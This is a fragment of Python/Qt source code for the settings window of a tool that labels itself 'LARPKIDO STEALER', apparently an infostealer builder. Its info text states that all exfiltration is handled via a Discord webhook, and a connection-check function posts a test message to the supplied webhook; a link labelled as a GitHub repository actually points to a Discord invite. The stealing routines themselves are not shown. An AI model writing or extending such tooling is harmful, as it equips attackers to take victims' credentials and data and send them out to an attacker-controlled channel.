...
class OptionsPage(QWidget):
    ...
    def init_ui(self):
        ...
        info_text = QLabel("LARPKIDO STEALER\n\nAll exfiltration is handled via Discord.\nMake sure to provide a valid webhook.")
        info_text.setStyleSheet("color: #aaa; font-size: 13px;")
        info_text.setAlignment(Qt.AlignCenter)
        
        github_link = QLabel('<a href="https://discord.gg/larpkido" style="color: #00a2ff; text-decoration: none; font-size: 14px; font-weight: bold;">GITHUB.COM/GLOCKINHAND/LARPKIDO-MULTITOOL</a>')
    ...
    def check_telegram(self):
        ...
        try:
            ...
            embed = {
                "embeds": [
                    {
                        "title": "LARPKIDO — Connection Check",
                        "description": "✅ Webhook connection successful.",
                        "color": 0x5865F2,
                        "footer": {
                            "text": "LARPKIDO • https://discord.gg/larpkido"
                        },
            ...
            if r.status_code in (200, 204):
                self.box = CustomMessageBox("LARPKIDO", "success", "LARPKIDO: check sent!")
            else:
                self.box = CustomMessageBox("LARPKIDO", "error", "LARPKIDO: invalid webhook")
            self.box.show()
        except Exception as e:
            self.box = CustomMessageBox("LARPKIDO", "error", "LARPKIDO: error")
            self.box.show()